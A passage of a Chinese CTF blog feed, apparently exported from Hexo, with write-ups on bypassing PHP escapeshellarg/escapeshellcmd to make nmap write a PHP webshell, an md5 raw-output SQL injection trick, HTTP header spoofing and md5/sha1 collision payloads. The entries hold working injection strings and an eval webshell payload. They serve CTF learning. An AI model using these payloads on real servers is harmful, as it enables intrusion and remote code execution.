class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);   </span><br><span class="line"><span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line"><span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br></pre></td></tr></table></figure><p>审计完毕，如果没有escapeshellarg()和escapeshellcmd()函数的处理，那就是之间利用nmap中-oG参数写入一句话木马然后蚁剑连接</p><h1 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h1><p><strong>escapeshellarg</strong> </p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">把字符串转码为可以在 <span class="built_in">shell</span> 命令里使用的参数</span><br><span class="line"></span><br><span class="line">功能 ：<span class="built_in">escapeshellarg</span>() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</span><br><span class="line">这样以确保能够直接将一个字符串传入 <span class="built_in">shell</span> 函数，<span class="built_in">shell</span> 函数包含 <span class="built_in">exec</span>(), <span class="keyword">system</span>() 执行运算符(反引号)</span><br><span class="line"></span><br><span class="line">定义 ：<span class="keyword">string</span> <span class="built_in">escapeshellarg</span> ( <span class="keyword">string</span> $arg )</span><br></pre></td></tr></table></figure><p><strong>escapeshellcmd</strong> </p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">shell</span> 元字符转义</span><br><span class="line"></span><br><span class="line">功能：<span class="built_in">escapeshellcmd</span>() 对字符串中可能会欺骗 <span class="built_in">shell</span> 命令执行任意命令的字符进行转义。</span><br><span class="line">此函数保证用户输入的数据在传送到 <span class="built_in">exec</span>() 或 <span class="keyword">system</span>() 函数，或者 执行操作符 之前进行转义。</span><br><span class="line"></span><br><span class="line">反斜线（\）会在以下字符之前插入： &amp;<span class="meta">#;`|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF*。 *’ 和 “ 仅在不配对儿的时候被转义。</span></span><br><span class="line">在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</span><br><span class="line"></span><br><span class="line">定义 ：<span class="keyword">string</span> <span class="built_in">escapeshellcmd</span> ( <span class="keyword">string</span> $command)</span><br></pre></td></tr></table></figure><p>这两个函数如果先使用escapeshellcmd()再使用escapeshellarg(),那将不会产生漏洞</p><p>但本题是相反</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);   </span><br><span class="line"><span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br></pre></td></tr></table></figure><p>就是说两次转义后没有考虑单引号的问题导致可以绕过</p><p>因为单引号会和最近的一个单引号闭合</p><p>利用一篇<a href="https://paper.seebug.org/164/">文章</a>的例子</p><ol><li><strong>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></strong></li><li><strong>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</strong></li><li><strong>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个不配对儿的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></strong></li><li><strong>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</strong></li></ol><h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>​    即使我们可以利用这个漏洞逃脱单引号的束缚，但因为上述两个函数的原因，我们无法进行命令注入，因为escapeshellcmd会对特殊符号前面添加反斜杠\进行转义</p><p>​    这个时候就需要nmap的-oG参数写木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span> -oG <span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p>这是nmap的将一句php代码写入1.php文件的代码</p><p>但如果直接填入却因为那两个函数无法执行</p><p><img src="/images/image-20211123195350571.png" alt="image-20211123195350571"></p><p>我们可以看到最终的结果是被单引号括起来的，此时会被解析为字符串而无法执行函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout <span class="number">2</span> -F <span class="string">&#x27;\&lt;\?php eval\(\$_POST\[\&quot;a\&quot;\]\)\;\?\&gt; -oG 1.php&#x27;</span></span><br></pre></td></tr></table></figure><p>那此时就需要利用这两个函数漏洞闭合单引号</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>只要添加一个单引号既可闭合所有,比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;?php phpinfo(); ?&gt; -oG 1.php</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20211123200356966.png" alt="image-20211123200356966"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>\\<span class="string">&#x27;&#x27;</span>\&lt;\?php phpinfo\(\)\; \?\&gt; -oG <span class="number">1</span>.php\<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>但是这个会在语句末尾新增一个引号，即1.php’  ，显然不是我们想要的</p><p>但如果在构造语句自己增加一个引号是否会闭合这个呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;?php phpinfo(); ?&gt; -oG 1.php&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20211123200639997.png" alt="image-20211123200639997"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>\\<span class="string">&#x27;&#x27;</span>\&lt;\?php phpinfo\(\)\; \?\&gt; -oG <span class="number">1</span>.php<span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;&#x27;</span>      </span><br><span class="line"><span class="comment">#我们对它进行解析</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>=&gt;闭合</span><br><span class="line">\\=&gt;转义成单个反斜杠，并不再具有转义其他字符的能力</span><br><span class="line">    <span class="string">&#x27;&#x27;</span>=&gt;闭合</span><br><span class="line">    <span class="string">&#x27;\\&#x27;</span>=&gt;视为字符串\\</span><br><span class="line">    <span class="string">&#x27;&#x27;</span>=&gt;闭合</span><br><span class="line">最终语句为<span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span> -oG <span class="number">1</span>.php\\，将文件储存在<span class="number">1</span>.php\\文件中</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>这也无法将语句储存在php文件中，也是失败告终</p><p>那我们可以添加一个空格对php后缀名与两个反斜杠隔离开来，应该就可以成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;?php phpinfo(); ?&gt; -oG 1.php &#x27;</span></span><br></pre></td></tr></table></figure><p>测试后成功写入</p><p><img src="/images/image-20211123201751304.png" alt="image-20211123201751304"></p><p>将phpinfo();更换为一句话木马，然后蚁剑连得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#x27;</span></span><br></pre></td></tr></table></figure><h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p><p><a href="https://blog.csdn.net/weixin_44348894/article/details/105520481?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link">https://blog.csdn.net/weixin_44348894/article/details/105520481?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;该题的知识点&quot;&gt;&lt;a href=&quot;#该题的知识点&quot; class=&quot;headerlink&quot; title=&quot;该题的知识点&quot;&gt;&lt;/a&gt;该题的知识点&lt;/h1&gt;&lt;p&gt;1.nmap的将命令和结果写到文件(也许能构造木马)&lt;/p&gt;
&lt;p&gt;2.escapeshellarg()和escapeshellcmd() 的绕过&lt;/p&gt;</summary>
    
    
    
    <category term="BUUCTF" scheme="http://example.com/categories/BUUCTF/"/>
    
    
  </entry>
  
  <entry>
    <title>sql</title>
    <link href="http://example.com/2021/11/16/md5%E5%92%8Csql/"/>
    <id>http://example.com/2021/11/16/md5%E5%92%8Csql/</id>
    <published>2021-11-16T12:37:18.000Z</published>
    <updated>2021-11-16T12:50:20.254Z</updated>
    
    <content type="html"><![CDATA[<p>当md5遇到了sql会发生什么</p><h1 id="ffifdyop"><a href="#ffifdyop" class="headerlink" title="ffifdyop"></a><strong>ffifdyop</strong></h1><p>一个奇奇怪怪的字符串</p><span id="more"></span><p>经过md5加密后：276f722736c95d99e921722cf9ed621c</p><p>再转换为字符串：’or’6&lt;乱码&gt; 即  <code>&#39;or&#39;66�]��!r,��b</code></p><p>用途：</p><p>面对</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">where</span> <span class="keyword">password</span>=md5($pass,<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>即可使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> admin where password=<span class="string">&#x27;&#x27;</span>o<span class="string">r&#x27;6&lt;乱码&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>就相当于select * from admin where password=’’or 1 实现sql注入</p><p>参考博客<a href="https://blog.csdn.net/March97/article/details/81222922">https://blog.csdn.net/March97/article/details/81222922</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;当md5遇到了sql会发生什么&lt;/p&gt;
&lt;h1 id=&quot;ffifdyop&quot;&gt;&lt;a href=&quot;#ffifdyop&quot; class=&quot;headerlink&quot; title=&quot;ffifdyop&quot;&gt;&lt;/a&gt;&lt;strong&gt;ffifdyop&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;一个奇奇怪怪的字符串&lt;/p&gt;</summary>
    
    
    
    <category term="知识点" scheme="http://example.com/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>HTTP</title>
    <link href="http://example.com/2021/11/16/HTTP/"/>
    <id>http://example.com/2021/11/16/HTTP/</id>
    <published>2021-11-16T11:36:12.000Z</published>
    <updated>2021-11-16T12:51:29.200Z</updated>
    
    <content type="html"><![CDATA[<p>对于HTTP类相关题目的理解和总结</p><p>在BP抓的包中可以修改header头，即对抓到的包进行修改，那我们就可以更改它的一些信息以符合题目要求</p><span id="more"></span><p>例如[极客大挑战 2019]Http</p><h1 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h1><p><img src="/images/image-20211116195835758.png" alt="image-20211116195835758"></p><p>面对这种情况是需要加Referer</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https:<span class="regexp">//</span>Sycsecret.buuoj.cn</span><br></pre></td></tr></table></figure><h1 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h1><p>这个头是设定游览器的</p><p><img src="/images/image-20211116200944878.png" alt="image-20211116200944878"></p><p>面对这种情况说要用Syclover游览器打开的，就需要修改User-Agent</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span>-Agent: Syclover</span><br></pre></td></tr></table></figure><p>题目要求的游览器大部分都是不存在的，但只要字符对了就行</p><h1 id="XFF-X-Forwarded-For"><a href="#XFF-X-Forwarded-For" class="headerlink" title="XFF(X-Forwarded-For)"></a>XFF(X-Forwarded-For)</h1><p>这个类型出的题比较多，修改XFF就是修改IP地址</p><p><img src="/images/image-20211116201316381.png" alt="image-20211116201316381"></p><p>它说需要本地访问，那只需要添加</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line">或者</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: localhost</span><br></pre></td></tr></table></figure><p>即可绕过</p><p><img src="/images/image-20211116201546042.png" alt="image-20211116201546042"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;对于HTTP类相关题目的理解和总结&lt;/p&gt;
&lt;p&gt;在BP抓的包中可以修改header头，即对抓到的包进行修改，那我们就可以更改它的一些信息以符合题目要求&lt;/p&gt;</summary>
    
    
    
    <category term="知识点" scheme="http://example.com/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>对于md5与sha1的强弱碰撞</title>
    <link href="http://example.com/2021/11/15/%E5%AF%B9%E4%BA%8Emd5%E4%B8%8Esha1%E7%9A%84%E5%BC%BA%E5%BC%B1%E7%A2%B0%E6%92%9E/"/>
    <id>http://example.com/2021/11/15/%E5%AF%B9%E4%BA%8Emd5%E4%B8%8Esha1%E7%9A%84%E5%BC%BA%E5%BC%B1%E7%A2%B0%E6%92%9E/</id>
    <published>2021-11-15T02:24:38.000Z</published>
    <updated>2021-11-23T12:30:19.304Z</updated>
    
    <content type="html"><![CDATA[<p>本文是对于知识点的总结，md5()和sha1()碰撞应该全在这了</p><span id="more"></span><p>a==b:弱类型比较会将a和b转成统一数据类型在进行比较，</p><p>a===b:强类型比较会先判断a和b是不是相同类型，不是，则返回false，是，再比较a和b的值。</p><h1 id="未过滤数组"><a href="#未过滤数组" class="headerlink" title="未过滤数组"></a>未过滤数组</h1><p>这个绕过是万能钥匙，对于强弱类型的都可适用</p><h2 id="对于md5绕过"><a href="#对于md5绕过" class="headerlink" title="对于md5绕过"></a>对于md5绕过</h2><p>比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>] !==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload:</p><p>?param1[]=1&amp;param2[]=2</p><p>还有另一种方法，0e开头的md5也可以绕过</p><p>例如：</p><p>QNKCDZO</p><p>0e830400451993494058024219903391</p><p>240610708</p><p>0e462097431906509019562988736854</p><p>s878926199a</p><p>0e545993274517709034328855841020</p><p>s155964671a</p><p>0e342768416822451524974117254469</p><p>s214587387a</p><p>0e848240448830537924465865611904</p><p>s214587387a</p><p>0e848240448830537924465865611904</p><p>s878926199a</p><p>0e545993274517709034328855841020</p><p>s1091221200a</p><p>0e940624217856561557816327384675</p><p>s1885207154a</p><p>0e509367213418206700842008763514</p><p>s1502113478a</p><p>0e861580163291561247404381396064</p><p>s1885207154a</p><p>0e509367213418206700842008763514</p><p>s1836677006a</p><p>0e481036490867661113260034900752</p><p>s155964671a</p><p>0e342768416822451524974117254469</p><p>s1184209335a</p><p>0e072485820392773389523109082030</p><p>s1665632922a</p><p>0e731198061491163073197128363787</p><p>s1502113478a</p><p>0e861580163291561247404381396064</p><p>s1836677006a</p><p>0e481036490867661113260034900752</p><p>s1091221200a</p><p>0e940624217856561557816327384675</p><p>s155964671a</p><p>0e342768416822451524974117254469</p><p>s1502113478a</p><p>0e861580163291561247404381396064</p><p>s155964671a</p><p>0e342768416822451524974117254469</p><p>s1665632922a</p><p>0e731198061491163073197128363787</p><p>s155964671a</p><p>0e342768416822451524974117254469</p><p>s1091221200a</p><p>0e940624217856561557816327384675</p><p>s1836677006a</p><p>0e481036490867661113260034900752</p><p>s1885207154a</p><p>0e509367213418206700842008763514</p><p>s532378020a</p><p>0e220463095855511507588041205815</p><p>s878926199a</p><p>0e545993274517709034328855841020</p><p>s1091221200a</p><p>0e940624217856561557816327384675</p><p>s214587387a</p><p>0e848240448830537924465865611904</p><p>s1502113478a</p><p>0e861580163291561247404381396064</p><p>s1091221200a</p><p>0e940624217856561557816327384675</p><p>s1665632922a</p><p>0e731198061491163073197128363787</p><p>s1885207154a</p><p>0e509367213418206700842008763514</p><p>s1836677006a</p><p>0e481036490867661113260034900752</p><p>s1665632922a</p><p>0e731198061491163073197128363787</p><p>s878926199a</p><p>0e545993274517709034328855841020</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</p><p>如果两个字符经MD5加密后为0exxxxx形式会被认为是科学计数法表示0*10的xxxx次方，值为零所以相等</p><p>sha1()函数也无法处理数组，于md5等价</p><h1 id="过滤数组"><a href="#过滤数组" class="headerlink" title="过滤数组"></a>过滤数组</h1><p>过滤了数组后就比较难搞</p><h2 id="sha1-绕过"><a href="#sha1-绕过" class="headerlink" title="sha1()绕过"></a>sha1()绕过</h2><p>user=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</p><p>pass=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p><p>参考连接</p><p><a href="https://blog.csdn.net/heiseweiye/article/details/82735640?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link">https://blog.csdn.net/heiseweiye/article/details/82735640?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link</a></p><h2 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h2><p>param1=</p><p>%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP</p><p>&amp;param2=</p><p>%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP</p><p>或者</p><p>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p><p>&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p><p>参考链接</p><p><a href="https://blog.csdn.net/weixin_30877493/article/details/99558878">https://blog.csdn.net/weixin_30877493/article/details/99558878</a></p><h1 id="MD5奇奇怪怪的知识"><a href="#MD5奇奇怪怪的知识" class="headerlink" title="MD5奇奇怪怪的知识"></a>MD5奇奇怪怪的知识</h1><h2 id="md5构造脚本"><a href="#md5构造脚本" class="headerlink" title="md5构造脚本"></a>md5构造脚本</h2><h3 id="筛选已经替md5中’cxhp’为’0123’后开头为’0e’的密文"><a href="#筛选已经替md5中’cxhp’为’0123’后开头为’0e’的密文" class="headerlink" title="筛选已经替md5中’cxhp’为’0123’后开头为’0e’的密文"></a>筛选已经替md5中’cxhp’为’0123’后开头为’0e’的密文</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="keyword">for</span>($a = <span class="number">1</span>; $a &lt;= <span class="number">100000000</span>; $a++) &#123;</span><br><span class="line">   $md5 = strtr(md5($a),<span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^0e\d+$/&#x27;</span>, $md5)) &#123;</span><br><span class="line">    echo $a;</span><br><span class="line">    echo <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    echo $md5;</span><br><span class="line">    echo <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><h3 id="该脚本筛选以ce开头的md5密文"><a href="#该脚本筛选以ce开头的md5密文" class="headerlink" title="该脚本筛选以ce开头的md5密文"></a>该脚本筛选以ce开头的md5密文</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">for</span>($a=<span class="number">1</span>;$a&lt;=<span class="number">1000000000</span>;$a++)&#123;</span><br><span class="line">   $md5 = md5($a);</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^ce\d+$/&#x27;</span>,$md5))&#123;</span><br><span class="line">      echo $a;</span><br><span class="line">      echo <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">      echo $md5;</span><br><span class="line">      echo <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="md5加密前后都是0e开头"><a href="#md5加密前后都是0e开头" class="headerlink" title="md5加密前后都是0e开头"></a>md5加密前后都是0e开头</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        text = <span class="string">&#x27;0e&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        m = md5(text)</span><br><span class="line">        <span class="built_in">print</span>(text,m)</span><br><span class="line">        <span class="keyword">if</span> m[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&#x27;0e&#x27;</span> :</span><br><span class="line">            <span class="keyword">if</span> m[<span class="number">2</span>:].isdigit():</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;find it:&#x27;</span>,text,<span class="string">&quot;:&quot;</span>,m)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        i +=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">run()</span><br></pre></td></tr></table></figure><p>跑出来的结果为0e215962017</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文是对于知识点的总结，md5()和sha1()碰撞应该全在这了&lt;/p&gt;</summary>
    
    
    
    <category term="知识点" scheme="http://example.com/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>sql注入初阶学习</title>
    <link href="http://example.com/2021/11/10/sql%E6%B3%A8%E5%85%A5%E5%88%9D%E9%98%B6/"/>
    <id>http://example.com/2021/11/10/sql%E6%B3%A8%E5%85%A5%E5%88%9D%E9%98%B6/</id>
    <published>2021-11-10T13:21:49.000Z</published>
    <updated>2021-11-16T12:51:55.404Z</updated>
    
